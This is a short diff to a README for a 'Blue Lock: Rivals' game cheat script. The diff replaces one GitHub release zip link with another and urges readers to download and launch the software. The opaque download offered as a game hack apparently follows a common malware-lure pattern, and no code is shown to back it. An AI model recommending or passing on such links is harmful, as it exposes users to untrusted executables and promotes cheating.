@@ -39,7 +39,7 @@ The "Blue Lock: Rivals Script Hack Auto Farm Pastebin 2025" is a powerful tool d
 
 ## Download
 To get started with the Blue Lock Rivals hack, download the software from the link below:
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue.svg)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/ahmetbaba122/Blue-Lock-Rivals/releases/download/v1.0/Release.zip)](https://github.com/ahmetbaba122/Blue-Lock-Rivals/releases/download/v1.0/Release.zip)
 
 🚀 **Launch the software and unleash the power of Blue Lock Rivals hack!**
 
